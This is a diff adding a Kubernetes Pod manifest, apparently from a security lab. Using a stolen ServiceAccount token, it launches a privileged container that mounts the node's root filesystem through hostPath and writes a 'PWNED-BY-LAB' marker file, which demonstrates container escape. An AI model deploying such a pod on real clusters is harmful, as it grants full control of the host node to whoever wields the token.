@@ -1,0 +1,25 @@
+{
+  "apiVersion": "v1",
+  "kind": "Pod",
+  "metadata": {
+    "name": "pwned-via-rbac",
+    "namespace": "default",
+    "labels": { "created-by": "stolen-serviceaccount-token" }
+  },
+  "spec": {
+    "containers": [
+      {
+        "name": "escape",
+        "image": "alpine:3.20",
+        "command": [
+          "sh",
+          "-c",
+          "echo 'This file was written to the underlying NODE filesystem by a Pod created using a stolen ServiceAccount token. Container escape via privileged + hostPath.' > /host/PWNED-BY-LAB.txt; sleep 3600"
+        ],
+        "securityContext": { "privileged": true },
+        "volumeMounts": [{ "name": "hostroot", "mountPath": "/host" }]
+      }
+    ],
+    "volumes": [{ "name": "hostroot", "hostPath": { "path": "/" } }]
+  }
+}
